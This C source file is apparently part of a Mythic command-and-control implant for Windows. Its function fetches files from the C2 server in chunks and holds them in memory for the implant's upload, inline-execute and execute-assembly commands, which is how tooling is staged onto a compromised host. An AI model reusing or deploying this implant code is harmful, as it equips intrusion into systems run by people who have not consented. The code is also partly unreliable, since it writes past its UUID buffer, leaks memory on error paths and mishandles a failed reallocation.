#include "Mythic.h"

#include "Package.h"
#include "Parser.h"
#include "Config.h"
#include "Task.h"


#if defined(INCLUDE_CMD_UPLOAD) || defined(INCLUDE_CMD_INLINE_EXECUTE) || defined(INCLUDE_CMD_EXECUTE_ASSEMBLY)
/**
 * @brief Fetches a file from Mythic server using its UUID
 * 
 * @param File Structure holds information for the file
 * @return DWORD status - 0 (success), or error code
 */
DWORD MythicGetFileBytes(_In_ PCHAR taskUuid, _Inout_ MYTHIC_FILE* File)
{
#define CHUNK_SIZE  512000      // 512 KB

    _dbg("Retrieving file from Mythic server ...");

    DWORD Status            = 0;
    PBYTE dataBuffer        = NULL;
    DWORD bytesAvailable 	= 0;
	DWORD totalBytesRead 	= 0;
	DWORD bytesRead 		= 0;

    dataBuffer = LocalAlloc(LPTR, CHUNK_SIZE);      // Freed in calling function
    if (!dataBuffer) {
        DWORD error = GetLastError();
        _err("Failed to allocate memory. ERROR : %d", error);
        Status = error;
        goto END;
    }

    File->currentChunk = 1;

    do
    {
    /*
     * Prepare the package to request current chunk
     * - chunk_num
     * - file_id
     * - full_path
     * - chunk_size
    */
        char* NotAPath = "a";  // We aren't writing file to disk, but need this field
        PPackage data = PackageInit(UPLOAD_CHUNKED, TRUE);
        PackageAddString(data, taskUuid, FALSE);
        PackageAddInt32(data, File->currentChunk);
        PackageAddBytes(data, File->fileUuid, TASK_UUID_SIZE, FALSE);
        PackageAddString(data, NotAPath, TRUE);
        PackageAddInt32(data, CHUNK_SIZE);
        
        // Send the package and receive the response
        PARSER Response = { 0 };
        PackageSend(data, &Response);
        

        BYTE success = ParserGetByte(&Response);
        if (success == FALSE)
        {
            _err("Returned failure status for chunk %d.", File->currentChunk);
            Status = ERROR_MYTHIC_UPLOAD;
            goto END;
        }
        
    /*
     * Response will ALWAYS hold data in the following order:
     * - File_id
     * - total_chunks
     * - chunk_num
     * - chunk_data
    */
        // Get file_id from response
        SIZE_T uuidLen  = TASK_UUID_SIZE;
        PCHAR fileUuid = ParserGetString(&Response, &uuidLen);
        if (fileUuid == NULL) 
        {
            _err("Failed to get UUID from response.");
            Status = ERROR_MYTHIC_UPLOAD;
            goto END;
        }
        
        // Copy file_id
        strncpy(File->fileUuid, fileUuid, TASK_UUID_SIZE + 1);
        File->fileUuid[TASK_UUID_SIZE + 1] = '\0';
        
        // Get total_chunks from response
        File->totalChunks = ParserGetInt32(&Response);

        // Current chunk number retrieved
        File->currentChunk = ParserGetInt32(&Response);

        // Get chunk data from the response
        SIZE_T bytesRead = 0;
        PBYTE chunk = ParserGetBytes(&Response, &bytesRead);
        if (!chunk)
        {
            _err("Failed to get chunk data for chunk %d.", File->currentChunk);
            Status = ERROR_MYTHIC_UPLOAD;
            goto END;
        }

        _dbg("Received %d bytes for chunk %d.", bytesRead, File->currentChunk);

        // Write chunk to buffer
        if (bytesRead == 0) break; 	// No more data
        
        // Check if more memory is needed
        if (totalBytesRead + bytesRead > bytesAvailable) {
            bytesAvailable = totalBytesRead + bytesRead;
            dataBuffer = LocalReAlloc(dataBuffer, bytesAvailable, LMEM_MOVEABLE | LMEM_ZEROINIT);
            if (!dataBuffer) {
                DWORD error = GetLastError();
                _err("Memory reallocation failed. ERROR : %d", error);
                Status = error;
                goto END;
            }
        }

        // Add chunk to data buffer
        memcpy(dataBuffer + totalBytesRead, chunk, bytesRead);
        totalBytesRead += bytesRead;

        // Clean up and prepare for the next chunk
        File->currentChunk++;
        PackageDestroy(data);
        ParserDestroy(&Response);

    } while (File->currentChunk <= File->totalChunks);

    _dbg("Chunked upload complete. File Size: %d bytes, Total chunks: %d", totalBytesRead, File->currentChunk - 1);

    File->buffer = dataBuffer;
    File->size   = totalBytesRead;

END:

    return Status;
}

#endif // INCLUDE_CMD_UPLOAD || INCLUDE_CMD_INLINE_EXECUTE || INCLUDE_CMD_EXECUTE_ASSEMBLY

// Another function where it writes the file to disk?

